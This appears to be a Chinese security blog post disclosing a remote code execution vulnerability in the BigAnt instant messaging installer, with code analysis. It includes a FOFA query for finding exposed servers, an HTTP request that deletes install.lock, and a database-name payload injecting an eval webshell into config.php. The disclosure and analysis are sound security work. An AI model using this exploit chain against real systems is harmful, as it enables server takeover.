---
title: "大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞"
source: https://mrxn.net/jswz/bigant-install-config-rce.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-安装程序二次注入致远程代码执行漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/26 13:32
* 262浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

安装程序

安装

即时通信


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

大蚂蚁 (BigAnt) 即时通讯系统安装程序存在二次注入漏洞。攻击者可通过删除或重命名 install.lock 文件，重新进入安装流程，并在数据库配置部分（如数据库用户、IP、端口、数据库名等字段）注入恶意 PHP 代码，实现[远程代码执行](https://mrxn.net/tag/rce)。

# 影响版本

BigAnt 5.5.x 及以上版本用户

短信和即时消息

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-001-af66cd8e6523.webp)](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

代码安全审计

深入探索

授权

安全研究报告

计算机安全

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"
>
> 漏洞修复方案

# 漏洞分析

先看安装程序的安装流程 Application/Install/Controller/InstallController.class.php 分为如下几个步骤

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-002-77edd4e0e247.webp)](https://image.mrxn.net/4f9be530b01e42d3a1f224e253455ad1.webp)

其中在初始化的部分检测是否存在安装文件 `data/install.lock`

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-003-03d999e73dfc.webp)](https://image.mrxn.net/450ce94900af4518a4c965163e76c2c8.webp)

如果存在则会直接退出，否则进入下一步，其中在第二步创建数据库的部分存在如下代码

短信和即时消息

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-004-183aed01407f.webp)](https://image.mrxn.net/bef997d534834fe39aed61f62f875ce6.webp)

其中调用了 `sp_create_config()` 方法进行配置文件的创建，而配置文件信息由用户提供

漏洞修复方案

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-005-f74d6b9b088b.webp)](https://image.mrxn.net/fa0277d7ce404308bae646cd4e6f2ec7.webp)

其中对部分字段如domain、email等有正则校验

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-006-5f2dcda91de8.webp)](https://image.mrxn.net/5f5ec9a531864693badcdbc6fa58c2d3.webp)

但是其余字段如数据库的dbtype、dbhost、dbname、dbuser、dbpwd等字段没有校验，被直接传递给`sp_create_config()` 方法，看下它的实现方式

```
function sp_create_config($config){

    sp_show_msg(L('_CREATE_CONFIG_PAGE_'));

    //windows的系统用GBK ，否则用 UTF-8,这个编码主要是文件系统时用到
    $os = strtoupper(substr(PHP_OS,0,3))==='WIN'?'windows':'linux';
    $config['CHARSET_OUT'] = $os == 'windows'?'GBK':'UTF-8';
    $config['DEFAULT_LANG'] = C('DEFAULT_LANG');

    if(is_array($config)){

       //读取配置内容
       $conf = file_get_contents(MODULE_PATH . 'Data/config.php');

       //替换配置项
       foreach ($config as $key => $value) {
          $conf = str_replace("#{$key}#", $value, $conf);
       }

       //写入应用配置文件
       if(file_put_contents( 'Application/Common/Conf/config.php', $conf)){
          sp_show_msg(L('_CONFIG_WRITE_SUCCESS_'));
       } else {
          sp_show_msg(L('_CONFIG_WRITE_FALIED_'), 'error');
          session('error', true);
       }
    }
```

读取 `Application/Install/Data/config.php`配置文件模板，然后进行替换操作

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-007-b5a080d857b7.webp)](https://image.mrxn.net/2474ef19700a494bad53b0c85a3ee472.webp)

替换前端传过来的配置信息后，写入`Application/Common/Conf/config.php`文件中，如果我们可以找到一个文件删除/重命名[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，删除掉/重命名`data/install.lock`，那么就可以二次安装代码注入了。

代码安全审计

经过搜索，在 `Application/Addin/Controller/PedometerController.class.php`找到了一处比较简单的方法 `uploadImgCallback()`

虽然此方法需要鉴权，但是可以通过其他方式如鉴权绕过、或者弱口令、钓鱼等方式获取到一个用户权限，重点看下它的实现方式

```
function uploadImgCallback(){
    $userId = I('userId');
    $src = I('src');
    $M_PedometerUser = D('Addin/PedometerUser');
    $where['user_id'] = $userId;
    $user= $M_PedometerUser->where($where)->find();
    if($user['background_img']){
       unlink(sp_charset_in2out(getPhysicalPath($user['background_img'])));
    }

    unset($where);

    $data['background_img'] = $src;
    $where['user_id'] = $userId;
    $res = $M_PedometerUser ->where($where)->save($data);
    $this->success($res);
}
```

`Addin/PedometerUser`模型定义如下

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-008-ffd514aaa85e.webp)](https://image.mrxn.net/8acb69781dc846429094cede92745a15.webp)

如果从数据库antdbms\_bigant（企业名）的ext\_jb\_user表中获取到了指定userId的background\_img值如果路径不存在，则更新表，否则先删除文件。其中getPhysicalPath、sp\_charset\_in2out方法实现如下

```
function getPhysicalPath($path){
    $patten = '/data(.*)/';
    preg_match($patten,$path,$pachPhy);
    $documentRoot = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
    return $documentRoot.'/'.$pachPhy[0];
}
```

我们只需要传递的src值是/data开头即可满足条件。

```
function sp_charset_in2out($str){
    $os = strtoupper(substr(PHP_OS,0,3))==='WIN'?'windows':'linux';
    $charset_out = $os == 'windows'?'GBK':'UTF-8';
    if (C('CHARSET_IN') != $charset_out){
       $str = iconv(C('CHARSET_IN'), $charset_out ,$str) ;
    }

    return $str ;
}
```

sp\_charset\_in2out 转码功能，不会处理路径。

完整利用流程：任意用户权限==>更新background\_img==>删除`install_bak.lock`==>安装配置注入RCE

代码安全审计

# 漏洞复现

## 设置路径

```
POST /?m=Addin&c=Pedometer&a=uploadImgCallback HTTP/1.1
Host: bigant.mrxn.net
Cookie: PHPSESSID=xxxxx
Content-Type: application/x-www-form-urlencoded

userId=1&src=/data/../data/install.lock
```

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-009-48143d1f6f79.webp)](https://image.mrxn.net/7b60c73361b7438aaeb561e33b7b7e37.webp)

同一个包需要发送两次，第一次更新表，第二次触发删除操作

漏洞修复方案

## RCE

访问 /install/install 安装配置，选择其他数据库,如果选择mysql需要数据库服务器存在且可以连通

```
//检测连接是否有效
$db  = Db::getInstance($dbconfig);
$sql = \Common\Lib\DBHelper::getCheckConnSql($dbconfig['DB_TYPE']);
$result = $db->query($sql);
if(false === $result){
       $url = U('step2',array('dbtype'=>$dbType,'err'=>'db'));
       $this->error(L('_ERROR_DB_CONNECT_'),$url);
   }
```

否则可以选择Oracle,会跳过存活检测

```
switch(strtolower($dbType)){
    case "oracle":
        break; // 直接跳过，不执行 createDataBase
    default:
        $res = \Common\Lib\DBHelper::createDataBase(...);
}
```

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-010-f9d65ed56507.webp)](https://image.mrxn.net/1a137034164b42d69142dfe41193a3d1.webp)

下一步

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-011-f298a7adab60.webp)](https://image.mrxn.net/f4fcb8cf016f4a549a86dd9b95256c3e.webp)

比如，将数据库名设置成`antdbms', 'test' => @eval($_REQUEST['cmd']),'`

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-012-1d15eabb1e34.webp)](https://image.mrxn.net/57a50759e36e497b94bf894ad23d0207.webp)

下一步

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-013-3d20c90c9272.webp)](https://image.mrxn.net/e3d891f374e74fb49d2a253bb4f245ef.webp)

查看 Application/Common/Conf/config.php 配置文件如下图所示

编程

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-014-a0032e7e5dfb.webp)](https://image.mrxn.net/4c9484aae0384ec898886efeae7b9614.webp)

成功写入并[执行php代码](https://mrxn.net/tag/rce)

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-015-ec3847c2adc2.webp)](https://image.mrxn.net/f1b4990b9e4d4ab38c1130fb387da78c.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.设置路径](#toc-5-1-)
* [5.2.RCE](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)  
文章链接：<https://mrxn.net/jswz/bigant-install-config-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-install-config-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKaklEQVR4AeyagXYbuQ5Dc/f//3lfYBQSPdLIk9a1ffappywoAKQmomWnaf/5+vr690/j31+/0ufX8gbhKt6Ewx9VT36w3D1ntHjPML4ZntVc4Y/9rtRc8Wgg3779+1NOoA3ke+JfP4nVFwB8gSO+2hvuNXmqnhzsA2N4oWquBLgWjLVGfRQzTnwietZCGPvNfPI+itQJ20C02PH+ExgGAp48zHH1yHklVM+Miw59j3AzXPWo/pkvXLD6wftXbpWD/UB7N7nqh14Lzme1w0Bmps297gT2QF531pd2eupAwFcxbw/CPAVYA0LdIdC+EQDnd4bDAuzRHgk458AadEzdofVtCd13I170x1MH8qJn/k9v87KB5NUozIkqP0a0P0E4f3XX/X66x5/UXt3r7wzk6u7bN5zAHshwJO8lhoHUaznLn/m4cP7WUvcB+yqXZwNrMP+7QXy1Njm4NuuKqROGB/uhY7QZqnYVs5phIDPT5l53Am0g0KcOj/OrjwjuNfPXVw/YV7nUhAN7gEhPwfQXArdvv2eNpSdmejhwD7iGqRO2gWix4/0nsAfy/hncPcE/uYJ/gumYHtCvarSK8VXupzl4j1ld+gvBPuWKmR/sgf6NAXQuNdA59VJEU/6M2DckJ/ohuBwI+BUxe1awBszkxuVV04jvBLh9cELHme/b+vB36oTgfrVIvALONekJsC/rM6x7HHNwDxixemHUlwOpxR+Q/188wj8wTgnMzU4ArNVXTnxgLeszTO1MB/c